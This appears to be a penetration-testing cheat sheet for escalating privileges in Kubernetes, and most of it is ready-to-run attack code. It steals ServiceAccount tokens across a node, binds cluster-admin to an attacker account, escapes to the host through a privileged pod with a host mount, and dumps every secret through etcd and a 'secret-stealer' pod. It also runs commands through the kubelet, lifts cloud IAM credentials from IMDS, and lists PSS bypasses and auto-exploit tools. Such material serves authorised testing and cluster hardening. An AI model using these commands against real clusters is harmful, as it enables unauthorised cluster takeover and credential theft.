# Kubernetes Privilege Escalation Techniques

Techniques for escalating privileges within Kubernetes clusters - from compromised pod to
cluster-admin, from node access to secret extraction, from RBAC misconfig to full control.

---

## Quick Assessment: What Can I Do?

```bash
# ServiceAccount token (auto-mounted in most pods)
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)
NAMESPACE=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace 2>/dev/null)
APISERVER="https://kubernetes.default.svc"
CACERT="/var/run/secrets/kubernetes.io/serviceaccount/ca.crt"

# Test API access
curl -sk --cacert "$CACERT" "$APISERVER/api" -H "Authorization: Bearer $TOKEN"

# What can this SA do? (self subject access review)
curl -sk --cacert "$CACERT" "$APISERVER/apis/authorization.k8s.io/v1/selfsubjectrulesreviews" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d "{\"apiVersion\":\"authorization.k8s.io/v1\",\"kind\":\"SelfSubjectRulesReview\",\"spec\":{\"namespace\":\"$NAMESPACE\"}}"

# Quick checks for high-value permissions
# List secrets
curl -sk --cacert "$CACERT" "$APISERVER/api/v1/secrets" -H "Authorization: Bearer $TOKEN" 2>&1 | head -5
# List all pods
curl -sk --cacert "$CACERT" "$APISERVER/api/v1/pods" -H "Authorization: Bearer $TOKEN" 2>&1 | head -5
# Create pods (test with dry-run)
curl -sk --cacert "$CACERT" "$APISERVER/api/v1/namespaces/$NAMESPACE/pods?dryRun=All" \
  -H "Authorization: Bearer $TOKEN" -X POST \
  -H "Content-Type: application/json" \
  -d '{"apiVersion":"v1","kind":"Pod","metadata":{"name":"test"},"spec":{"containers":[{"name":"t","image":"alpine"}]}}' 2>&1 | head -5
```

If `kubectl` is available (not common in pods, but worth checking):
```bash
kubectl auth can-i --list
kubectl auth can-i create pods
kubectl auth can-i get secrets
kubectl auth can-i '*' '*'  # cluster-admin check
```

---

## 1. ServiceAccount Token Abuse

### Pre-1.24 (Legacy Tokens)

Before k8s 1.24, ServiceAccount tokens were:
- Non-expiring
- Auto-mounted to every pod (unless opted out)
- Stored as Secrets in the namespace

```bash
# Token is at:
cat /var/run/secrets/kubernetes.io/serviceaccount/token

# Use it from outside the cluster
kubectl --token="$TOKEN" --server="$APISERVER" --insecure-skip-tls-verify get pods
```

### Post-1.24 (Bound Tokens)

Tokens are now projected (time-limited, audience-bound). Still auto-mounted by default unless
`automountServiceAccountToken: false` is set on the pod or SA.

```bash
# Check if token is bound (has expiration)
# Decode the JWT (middle section)
echo "$TOKEN" | cut -d. -f2 | base64 -d 2>/dev/null | python3 -m json.tool
# Look for "exp" field - if present, token expires
```

### Token Theft from Other Pods (with node access)

If you have node-level access, you can steal tokens from all pods on that node:

```bash
# Find all mounted SA tokens
find /var/lib/kubelet/pods/ -name 'token' -path '*/serviceaccount/*' 2>/dev/null

# Read each and check what permissions it has
for t in $(find /var/lib/kubelet/pods/ -name 'token' -path '*/serviceaccount/*' 2>/dev/null); do
  echo "=== $t ==="
  TOKEN=$(cat "$t")
  curl -sk "$APISERVER/apis/authorization.k8s.io/v1/selfsubjectrulesreviews" \
    -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    -d '{"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectRulesReview","spec":{"namespace":"default"}}' 2>&1 | head -20
done
```

---

## 2. RBAC Abuse

### Dangerous Permission Combinations

| Permission | Why It's Dangerous |
|------------|-------------------|
| `create pods` | Schedule privileged pod, mount host filesystem |
| `get secrets` | Read all secrets in namespace (or cluster-wide) |
| `create/update rolebindings` | Grant yourself any role |
| `escalate` verb on roles | Bypass RBAC escalation prevention |
| `bind` verb on roles | Bind any role to yourself |
| `impersonate` users/groups | Act as any user including system:masters |
| `create tokenrequest` | Generate tokens for any SA |
| `update/patch pods` | Inject containers, change images |
| `create/update daemonsets` | Run on every node |
| `exec` on pods | Shell into any pod in the namespace |
| Wildcard `*` on verbs/resources | Everything - check for this first |

### Exploiting create/update RoleBindings

If you can create or update RoleBindings:

```bash
# Bind cluster-admin to your ServiceAccount
cat <<'EOF' | kubectl apply -f -
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
  name: pwned
subjects:
- kind: ServiceAccount
  name: YOUR_SA_NAME
  namespace: YOUR_NAMESPACE
roleRef:
  kind: ClusterRole
  name: cluster-admin
  apiGroup: rbac.authorization.k8s.io
EOF
```

### Exploiting Impersonation

```bash
# If you have impersonate permissions
kubectl auth can-i impersonate users
kubectl auth can-i impersonate groups

# Impersonate cluster-admin group
kubectl --as=system:serviceaccount:kube-system:default \
  --as-group=system:masters get secrets -A
```

---

## 3. Pod-Based Escalation

If you can create pods (or deployments/jobs/cronjobs/daemonsets), you can likely get node-level
or cluster-admin access.

### Privileged Pod with Host Mount

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: pwned
  namespace: TARGET_NAMESPACE
spec:
  hostPID: true
  hostNetwork: true
  containers:
  - name: pwned
    image: alpine
    command: ["/bin/sh", "-c", "sleep infinity"]
    securityContext:
      privileged: true
    volumeMounts:
    - name: hostfs
      mountPath: /host
  volumes:
  - name: hostfs
    hostPath:
      path: /
      type: Directory
  # Optionally target a specific node
  # nodeSelector:
  #   kubernetes.io/hostname: target-node
```

Then: `kubectl exec -it pwned - chroot /host bash`

### Escape to Node via nsenter

If `hostPID: true`:

```bash
# Enter all namespaces of host PID 1
nsenter -t 1 -m -u -i -n -p - /bin/bash
```

### Stealing Secrets via Pod

If you can create pods but not directly get secrets, mount them as environment variables
or volumes:

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: secret-stealer
spec:
  containers:
  - name: stealer
    image: alpine
    command: ["/bin/sh", "-c", "env; cat /secrets/*; sleep infinity"]
    envFrom:
    - secretRef:
        name: TARGET_SECRET_NAME
    volumeMounts:
    - name: secrets
      mountPath: /secrets
  volumes:
  - name: secrets
    secret:
      secretName: TARGET_SECRET_NAME
```

---

## 4. etcd Direct Access

etcd stores all cluster state including secrets (base64, not encrypted by default).

### Default Ports

- 2379: client communication
- 2380: peer communication

### Access from Node

```bash
# Check if etcd is accessible
curl -sk https://127.0.0.1:2379/version 2>/dev/null

# Find etcd certs (usually on control plane nodes)
ls /etc/kubernetes/pki/etcd/
# ca.crt, server.crt, server.key, peer.crt, peer.key

# Read all secrets from etcd
ETCDCTL_API=3 etcdctl \
  --endpoints=https://127.0.0.1:2379 \
  --cacert=/etc/kubernetes/pki/etcd/ca.crt \
  --cert=/etc/kubernetes/pki/etcd/server.crt \
  --key=/etc/kubernetes/pki/etcd/server.key \
  get /registry/secrets --prefix --keys-only

# Get specific secret
ETCDCTL_API=3 etcdctl \
  --endpoints=https://127.0.0.1:2379 \
  --cacert=/etc/kubernetes/pki/etcd/ca.crt \
  --cert=/etc/kubernetes/pki/etcd/server.crt \
  --key=/etc/kubernetes/pki/etcd/server.key \
  get /registry/secrets/NAMESPACE/SECRET_NAME
```

---

## 5. Kubelet API Abuse

The kubelet API runs on port 10250 (authenticated) and sometimes 10255 (read-only, deprecated).

### Anonymous Auth Check

```bash
# Check if anonymous auth is enabled (shouldn't be, but sometimes is)
curl -sk https://NODE_IP:10250/pods

# Read-only port (if enabled)
curl -s http://NODE_IP:10255/pods
```

### With Valid Credentials

```bash
# List pods on this node
curl -sk https://NODE_IP:10250/pods \
  --cert /path/to/client.crt --key /path/to/client.key

# Execute command in a pod via kubelet (bypasses RBAC)
curl -sk https://NODE_IP:10250/run/NAMESPACE/POD_NAME/CONTAINER_NAME \
  --cert /path/to/client.crt --key /path/to/client.key \
  -d "cmd=id"
```

### kubeletctl Tool

```bash
# List pods
kubeletctl pods -s NODE_IP

# Scan for RCE
kubeletctl scan rce -s NODE_IP

# Execute command
kubeletctl exec "/bin/bash" -s NODE_IP -p POD_NAME -c CONTAINER_NAME
```

---

## 6. Node-to-Cluster Escalation

If you've compromised a node (worker or control plane):

### kubeconfig Files

```bash
# Admin kubeconfig (control plane nodes)
cat /etc/kubernetes/admin.conf 2>/dev/null
cat /etc/kubernetes/kubelet.conf 2>/dev/null
cat /etc/kubernetes/controller-manager.conf 2>/dev/null
cat /etc/kubernetes/scheduler.conf 2>/dev/null

# User kubeconfigs
find / -name 'kubeconfig' -o -name '.kubeconfig' -o -name 'config' -path '*/.kube/*' 2>/dev/null

# k3s specific
cat /etc/rancher/k3s/k3s.yaml 2>/dev/null
```

### Static Pod Manifests

On control plane nodes, static pod manifests are at `/etc/kubernetes/manifests/`.
Modifying these restarts the pod with your changes:

```bash
ls /etc/kubernetes/manifests/
# kube-apiserver.yaml, kube-controller-manager.yaml, etcd.yaml, etc.

# Example: add hostPath mount to kube-apiserver to read host files
```

### Cloud IMDS from Node

```bash
# AWS - get node's IAM role credentials
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/
ROLE=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/)
curl -s "http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE"

# GCP - get node's service account token
curl -s -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
```

---

## 7. Pod Security Standards Bypass

PSS replaced PodSecurityPolicy (removed in 1.25). Enforcement is via namespace labels.

### Check Enforcement Level

```bash
kubectl get ns TARGET_NAMESPACE -o jsonpath='{.metadata.labels}' | python3 -m json.tool
# Look for:
# pod-security.kubernetes.io/enforce: restricted|baseline|privileged
# pod-security.kubernetes.io/warn: ...
# pod-security.kubernetes.io/audit: ...
```

### Bypass Strategies

- **No label = no enforcement** - check if the namespace has PSS labels at all
- **warn/audit only** - pods still run, just generate warnings
- **Create pod in unlabeled namespace** - if you can create namespaces
- **Namespace label manipulation** - if you can update namespace labels, change enforcement to `privileged`
- **Ephemeral containers** - may bypass some checks (depends on admission config)
- **Static pods on nodes** - bypass all admission (direct kubelet, not API)

---

## 8. Notable Kubernetes CVEs (2024-2026)

| CVE | CVSS | Component | Impact |
|-----|:----:|-----------|--------|
| CVE-2025-1974 | 9.8 | ingress-nginx admission controller | **IngressNightmare**: unauth RCE via NGINX config injection. No creds needed - send malicious AdmissionReview to webhook, upload shared lib via body buffering, load via ssl_engine. Reads all cluster secrets. 40%+ of cloud envs vulnerable. Fixed in ingress-nginx 1.11.5/1.12.1. |
| CVE-2024-10220 | 8.1 | kubelet gitRepo volume | Arbitrary command exec on host via malicious git hooks in gitRepo volume. Fixed in 1.28.12/1.29.7/1.30.3. |
| nodes/proxy GET | N/A | RBAC/kubelet proxy | `nodes/proxy` GET enables exec into any pod via WebSocket upgrade. Monitoring SAs (Prometheus, Alloy) commonly have this. K8s team: "Won't Fix, Working as Intended." Fine-grained perms expected in k8s 1.36 (Apr 2026). |
| CVE-2024-3177 | 2.7 | SA admission plugin | Bypass mountable secrets policy via envFrom in init/ephemeral containers. Fixed in 1.27.13/1.28.9/1.29.4. |

---

## 9. Kubernetes Enumeration Tools

### kubectl-who-can

```bash
# Who can get secrets cluster-wide?
kubectl-who-can get secrets -A

# Who can create pods in this namespace?
kubectl-who-can create pods -n TARGET_NAMESPACE

# Who can exec into pods?
kubectl-who-can create pods/exec -n TARGET_NAMESPACE
```

### kube-hunter

```bash
# Remote scan
kube-hunter --remote TARGET_IP

# Internal scan (from within cluster)
kube-hunter --pod
```

### Peirates (k8s pentest tool)

```bash
# Interactive k8s attack tool
./peirates
# Menu-driven: dump secrets, create pods, move laterally
```

### CDK (from container)

```bash
# Kubernetes-specific checks
./cdk evaluate

# Attempt automated exploitation
./cdk auto-escape
./cdk exploit k8s-configmap-dump
./cdk exploit k8s-secret-dump
```
